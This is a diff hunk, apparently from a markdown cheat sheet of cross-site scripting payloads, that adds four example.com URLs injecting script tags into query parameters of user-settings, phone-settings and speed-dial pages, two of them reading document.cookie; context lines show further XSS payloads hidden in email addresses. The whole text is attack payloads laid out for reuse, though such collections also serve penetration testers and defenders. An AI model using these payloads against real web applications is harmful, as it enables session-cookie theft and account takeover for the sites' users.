@@ -698,6 +698,11 @@ test@gmail(<script>alert(0)</script>).com
 "<script>alert(0)</script>"@gmail.com
 
 “<script src=x onerror=confirm(8)>”@gmail.com
+https://example.com/userapp/userSettings.html?emailSuccessMessage=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+- https://example.com/userapp/phoneSettings.html?successMessage=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+- https://example.com/userapp/phoneSettingsAction.html?formAction=&callForwardingFlag=1&callForwardNumber=SOMEDATA"><script>alert`XSS`</script>&apply=Apply Changes
+- https://example.com/userapp/directoriesAction.html?formAction=applySpeedDialChanges&callEntryToDelete=&newSpeedDialName(1)=&newSpeedDialNumber(1)=&newSpeedDialName(2)=&newSpeedDialNumber(2)=&newSpeedDialName(3)=&newSpeedDialNumber(3)=&newSpeedDialName(4)=&newSpeedDialNumber(4)=&newSpeedDialName(5)=&newSpeedDialNumber(5)=&newSpeedDialName(6)=&newSpeedDialNumber(6)=&newSpeedDialName(7)=&newSpeedDialNumber(7)=&newSpeedDialName(8)=&newSpeedDialNumber(8)=&newSpeedDialName(9)=&newSpeedDialNumber(9)=&newSpeedDialName(10)=&newSpeedDialNumber(10)=&newSpeedDialName(11)=&newSpeedDialNumber(11)=&newSpeedDialName(12)=&newSpeedDialNumber(12)=SOMEDATA<script>alert`XSS`</script>&newSpeedDialName(13)=&newSpeedDialNumber(13)=&newSpeedDialName(14)=&newSpeedDialNumber(14)=&newSpeedDialName(15)=&newSpeedDialNumber(15)=&newSpeedDialName(16)=&newSpeedDialNumber(16)=&newSpeedDialName(17)=&newSpeedDialNumber(17)=&newSpeedDialName(18)=&newSpeedDialNumber(18)=&newSpeedDialName(19)=&newSpeedDialNumber(19)=&newSpeedDialName(20)=&newSpeedDialNumber(20)=&applySpeedDialChanges=Apply
+
 ```
 
 ## Blind XSS
